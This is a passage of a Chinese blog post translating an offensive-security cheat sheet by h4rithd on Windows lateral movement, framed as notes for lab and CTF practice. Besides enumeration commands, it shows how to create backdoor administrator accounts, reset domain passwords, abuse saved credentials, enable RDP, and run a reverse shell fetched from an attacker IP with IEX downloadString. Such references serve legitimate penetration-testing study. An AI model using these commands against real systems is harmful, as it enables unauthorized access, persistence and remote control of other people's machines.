

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="笔记说明：该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows常用命令-横向移动-h4rithd-2024.04.03版本">
<meta property="og:url" content="https://sh1yan.top/2024/06/02/Windows-Common-Command-Horizontal-Move-h4rithd-20240403/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="笔记说明：该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-06-02T15:50:55.000Z">
<meta property="article:modified_time" content="2024-06-02T14:58:19.568Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="Offensive security">
<meta property="article:tag" content="Windows Common Command">
<meta property="article:tag" content="Horizontal Move">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>Windows常用命令-横向移动-h4rithd-2024.04.03版本 - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/P2note/" target="_self">
                    
                    <span>综合安全工具集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Windows常用命令-横向移动-h4rithd-2024.04.03版本"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-02 23:50" pubdate>
          2024年6月2日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          37k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          307 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Windows常用命令-横向移动-h4rithd-2024.04.03版本</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="笔记说明："><a href="#笔记说明：" class="headerlink" title="笔记说明："></a>笔记说明：</h1><p>该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。</p>
<span id="more"></span>  

<h1 id="横向运动"><a href="#横向运动" class="headerlink" title="横向运动"></a>横向运动</h1><h2 id="01-常用命令"><a href="#01-常用命令" class="headerlink" title="01.常用命令"></a>01.常用命令</h2><h3 id="01-1-操作系统枚举"><a href="#01-1-操作系统枚举" class="headerlink" title="01.1 操作系统枚举"></a>01.1 操作系统枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 获取基本详细信息</span><br>systeminfo<br>systeminfo | findstr /B /C:<span class="hljs-string">&quot;OS Name&quot;</span> /C:<span class="hljs-string">&quot;OS Version&quot;</span><br>whoami /all<br>[<span class="hljs-type">System.Environment</span>]::OSVersion.Version<br><span class="hljs-built_in">Get-ComputerInfo</span> | <span class="hljs-built_in">Select-Object</span> WindowsProductName, WindowsVersion, OsHardwareAbstractionLayerVersion<br>(<span class="hljs-built_in">Get-ItemProperty</span> <span class="hljs-string">&quot;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;</span>).ReleaseId<br><br><span class="hljs-comment">## ------------------| 获取环境路径</span><br><span class="hljs-comment">##[Powershell]</span><br><span class="hljs-built_in">Get-ChildItem</span> Env: | <span class="hljs-built_in">ft</span> Key,Value<br><span class="hljs-built_in">dir</span> env:<br><br><span class="hljs-comment">## ------------------| Get .Net Version (cmd/ps)</span><br>reg query <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP&quot;</span><br><br><span class="hljs-comment">## ------------------| 获取系统架构 32 or 64 </span><br><span class="hljs-comment">##[Powershell]</span><br><span class="hljs-variable">$env:PROCESSOR_ARCHITECTURE</span><br>[<span class="hljs-type">Environment</span>]::Is64BitProcess<br>[<span class="hljs-type">Environment</span>]::Is64BitOperatingSystem<br><span class="hljs-comment">##[cmd]</span><br><span class="hljs-built_in">set</span> processor<br><br><span class="hljs-comment">## ------------------| 提取操作系统补丁和更新</span><br>wmic qfe <br><br><span class="hljs-comment">## ------------------| 列出所有已安装的带有修补程序的软件 (</span><br>wmic product get name, version, vendor<br><br><span class="hljs-comment">## ------------------| 列出所有磁盘</span><br>mountvol<br>wmic logicaldisk get caption,description,providername<br><br><span class="hljs-comment">## ------------------| 列出防火墙状态和当前配置</span><br>netsh advfirewall firewall dump<br>netsh firewall show state<br>netsh firewall show config<br>netsh advfirewall firewall show rule name=all<br></code></pre></td></tr></table></figure>

<h3 id="01-2-用户枚举"><a href="#01-2-用户枚举" class="headerlink" title="01.2 用户枚举"></a>01.2 用户枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Get current username</span><br><span class="hljs-built_in">echo</span> %USERNAME% || whoami<br><span class="hljs-variable">$env:username</span><br><br><span class="hljs-comment">## ------------------| List user info</span><br>net user &lt;UserName&gt;<br><br><span class="hljs-comment">## ------------------| 获取用户配置文件（主）目录 </span><br><span class="hljs-built_in">write-host</span> <span class="hljs-variable">$env:USERPROFILE</span><br><br><span class="hljs-comment">## ------------------| List user 特权</span><br>whoami /priv<br>whoami /groups<br><br><span class="hljs-comment">## ------------------| List all users</span><br>net user<br>whoami /all<br><span class="hljs-built_in">Get-LocalUser</span> | <span class="hljs-built_in">ft</span> Name,Enabled,LastLogon<br><span class="hljs-built_in">Get-ChildItem</span> C:\Users <span class="hljs-literal">-Force</span> | <span class="hljs-built_in">select</span> Name<br><br><span class="hljs-comment">## ------------------| 列出登录要求</span><br>net accounts<br><br><span class="hljs-comment">## ------------------| List all local groups</span><br>net localgroup<br><span class="hljs-built_in">Get-LocalGroup</span> | <span class="hljs-built_in">ft</span> Name<br><br><span class="hljs-comment">## ------------------| 获取有关组的详细信息</span><br>net localgroup administrators<br><span class="hljs-built_in">Get-LocalGroupMember</span> Administrators | <span class="hljs-built_in">ft</span> Name, PrincipalSource<br><span class="hljs-built_in">Get-LocalGroupMember</span> Administrateurs | <span class="hljs-built_in">ft</span> Name, PrincipalSource<br><br><span class="hljs-comment">## ------------------| 获取域控制器</span><br>nltest /DCLIST:DomainName<br>nltest /DCNAME:DomainName<br>nltest /DSGETDC:DomainName<br><br><span class="hljs-comment">## ------------------| Get Domain Users</span><br>net view /domain<br>net view /domain:DomainName<br></code></pre></td></tr></table></figure>

<ul>
<li>创建用户</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Local account</span><br><span class="hljs-comment">## Crearte local user</span><br>net user /add harith Password@<span class="hljs-number">123</span><br><span class="hljs-comment">## Add to the admin group</span><br>net localgroup administrators harith  /add<br><span class="hljs-comment">## Add to the Remote Desktop Users</span><br>net localgroup <span class="hljs-string">&quot;Remote Desktop Users&quot;</span> harith  /add<br><br><span class="hljs-comment">## ------------------| Domain account</span><br><span class="hljs-comment">## 此命令只能在Windows域控制器上使用</span><br>net user h4rithd Passw0<span class="hljs-built_in">rD</span><span class="hljs-variable">$</span> /add /domain<br><br><span class="hljs-comment"># Check members on </span><br>net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Exchange Windows Permissions&quot;</span><br><br><span class="hljs-comment"># Add members to </span><br>net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Exchange Windows Permissions&quot;</span> /add h4rithd<br></code></pre></td></tr></table></figure>

<ul>
<li>以其他用户身份登录</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| If you have RDP</span><br>runAs /user:h4rithd cmd.exe<br>powershell.exe <span class="hljs-built_in">Start-Process</span> cmd.exe <span class="hljs-literal">-Verb</span> runAs /user:h4rithd<br><br><span class="hljs-comment">## ------------------| Create Creds Object</span><br><span class="hljs-variable">$env:ComputerName</span><br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;ComputerName\USERNAME&quot;</span> <span class="hljs-comment"># It&#x27;s better to use with $user = &quot;&lt;hostname&gt;\&lt;username&gt;&quot;</span><br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;PASSWORD&quot;</span><br><span class="hljs-variable">$secStringPass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$pass</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$Creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-variable">$user</span>,<span class="hljs-variable">$secStringPass</span>)<br><span class="hljs-comment">## OR -----------------------------------------------------------------------------------------------------</span><br><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">convertto-securestring</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;PASSWORD&quot;</span><br><span class="hljs-variable">$Creds</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential - ArgumentList <span class="hljs-string">&quot;ComputerName\USERNAME&quot;</span>,<span class="hljs-variable">$pass</span><br><br><span class="hljs-comment">## ------------------| 将Creds对象用于活动</span><br><span class="hljs-comment">### Get Hostname using hostname command</span><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Creds</span> <span class="hljs-literal">-ComputerName</span> &lt;IP/LOCALHOST or Hostname&gt; <span class="hljs-literal">-ScriptBlock</span> &#123; whoami &#125;<br><span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Creds</span> <span class="hljs-literal">-ComputerName</span> &lt;IP/LOCALHOST or Hostname&gt;<br><span class="hljs-built_in">Start-Process</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Creds</span> <span class="hljs-literal">-FilePath</span> Powershell <span class="hljs-literal">-argumentlist</span> <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.10.14.22/rev.ps1&#x27;)&quot;</span>      <br><br><span class="hljs-comment">## 双跃点访问（身份验证CredSSP）</span><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> helpline <span class="hljs-literal">-Authentication</span> CredSSP <span class="hljs-literal">-credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; whoami &#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>更改密码</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Pas$word!&#x27;</span> <span class="hljs-literal">-asPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Set-DomainUserPassword</span> Herman <span class="hljs-literal">-AccountPassword</span> <span class="hljs-variable">$pass</span> <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>

<ul>
<li>存储的凭证 | 已保存的积分</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmdkey /list<br>runas /savecred /user:&lt;USERNAME&gt; C:\&lt;PATH&gt;\shell.exe<br></code></pre></td></tr></table></figure>

<h3 id="01-3-网络枚举"><a href="#01-3-网络枚举" class="headerlink" title="01.3 网络枚举"></a>01.3 网络枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| List all listening ports</span><br>netstat <span class="hljs-literal">-ano</span> | findstr /i listen<br>netstat <span class="hljs-literal">-anop</span> tcp<br><br><span class="hljs-comment">## ------------------| List all network interfaces, IP, and DNS.</span><br>ipconfig /all<br><span class="hljs-built_in">Get-NetIPConfiguration</span> | <span class="hljs-built_in">ft</span> InterfaceAlias,InterfaceDescription,IPv4Address<br><span class="hljs-built_in">Get-DnsClientServerAddress</span> <span class="hljs-literal">-AddressFamily</span> IPv4 | <span class="hljs-built_in">ft</span><br><br><span class="hljs-comment">## ------------------| 列出当前路由表</span><br>route print<br><span class="hljs-built_in">Get-NetRoute</span> <span class="hljs-literal">-AddressFamily</span> IPv4 | <span class="hljs-built_in">ft</span> DestinationPrefix,NextHop,RouteMetric,ifIndex<br><br><span class="hljs-comment">## ------------------| List the ARP table</span><br>arp <span class="hljs-literal">-A</span><br><span class="hljs-built_in">Get-NetNeighbor</span> <span class="hljs-literal">-AddressFamily</span> IPv4 | <span class="hljs-built_in">ft</span> ifIndex,IPAddress,LinkLayerAddress,State<br><br><span class="hljs-comment">## ------------------| 列出所有网络共享</span><br>net share<br>powershell <span class="hljs-built_in">Find-DomainShare</span> <span class="hljs-literal">-ComputerDomain</span> domain.local<br><br><span class="hljs-comment">## ------------------| SNMP配置</span><br>reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s<br><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-path</span> HKLM:\SYSTEM\CurrentControlSet\Services\SNMP <span class="hljs-literal">-Recurse</span><br></code></pre></td></tr></table></figure>

<ul>
<li>打开 RDP</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------|  启用RDP</span><br><span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server&#x27;</span> <span class="hljs-literal">-name</span> <span class="hljs-string">&quot;fDenyTSConnections&quot;</span> <span class="hljs-literal">-value</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment">## ------------------|  通过RDP启用身份验证</span><br><span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#x27;</span> <span class="hljs-literal">-name</span> <span class="hljs-string">&quot;UserAuthentication&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span>    <br><br><span class="hljs-comment">## ------------------|  通过Windows防火墙启用RDP</span><br><span class="hljs-built_in">Enable-NetFirewallRule</span> <span class="hljs-literal">-DisplayGroup</span> <span class="hljs-string">&quot;Remote Desktop&quot;</span> <br><br><span class="hljs-comment">## ------------------|  Using MSF</span><br>use post/windows/manage/enable_rdp<br><span class="hljs-built_in">set</span> Username h4rithd<br><span class="hljs-built_in">set</span> Password Password123!<br><span class="hljs-built_in">set</span> SESSION <span class="hljs-number">1</span><br>info<br>run<br><br><span class="hljs-comment">## ------------------| Login to the RDP</span><br>rdesktop <span class="hljs-literal">-g</span> <span class="hljs-number">1920</span>x1080 &lt;IP&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>Ping 扫描</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Genaral</span><br><span class="hljs-number">1</span>..<span class="hljs-number">255</span> | % &#123;<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.1.<span class="hljs-variable">$_</span>&quot;</span>; ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> <span class="hljs-literal">-w</span> <span class="hljs-number">100</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1</span>.<span class="hljs-variable">$_</span>&#125; | <span class="hljs-built_in">Select-String</span> ttl<br><br><span class="hljs-comment">## ------------------| 平行ping清扫器</span><br>workflow ParallelSweep &#123; <span class="hljs-keyword">foreach</span> <span class="hljs-literal">-parallel</span> <span class="hljs-literal">-throttlelimit</span> <span class="hljs-number">4</span> (<span class="hljs-variable">$i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">1</span>..<span class="hljs-number">255</span>) &#123;ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> <span class="hljs-literal">-w</span> <span class="hljs-number">100</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.<span class="hljs-variable">$i</span>&#125;&#125;; ParallelSweep | <span class="hljs-built_in">Select-String</span> ttl<br><br><span class="hljs-comment">## ------------------| 带操作系统检测的多子网ping清除器</span><br><span class="hljs-number">0</span>..<span class="hljs-number">10</span> | % &#123; <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_</span>; <span class="hljs-number">1</span>..<span class="hljs-number">255</span> | % &#123; <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_</span>; ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> <span class="hljs-literal">-w</span> <span class="hljs-number">10</span> <span class="hljs-string">&quot;10.0.<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>&quot;</span> | <span class="hljs-built_in">select-string</span> TTL | % &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_</span> <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;ms&quot;</span>) &#123; <span class="hljs-variable">$ttl</span> = <span class="hljs-variable">$_</span>.line.split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>] <span class="hljs-operator">-as</span> [<span class="hljs-built_in">int</span>]; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ttl</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">65</span>) &#123; <span class="hljs-variable">$os</span> = <span class="hljs-string">&quot;Linux&quot;</span> &#125; <span class="hljs-keyword">ElseIf</span> (<span class="hljs-variable">$ttl</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">64</span> <span class="hljs-operator">-And</span> <span class="hljs-variable">$ttl</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">129</span>) &#123; <span class="hljs-variable">$os</span> = <span class="hljs-string">&quot;Windows&quot;</span> &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-variable">$os</span> = <span class="hljs-string">&quot;Cisco&quot;</span>&#125;; <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;10.0.<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span> OS: <span class="hljs-variable">$os</span>&quot;</span>; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.0.<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>&quot;</span> &gt;&gt; scan_results.txt &#125;&#125;&#125; &#125;     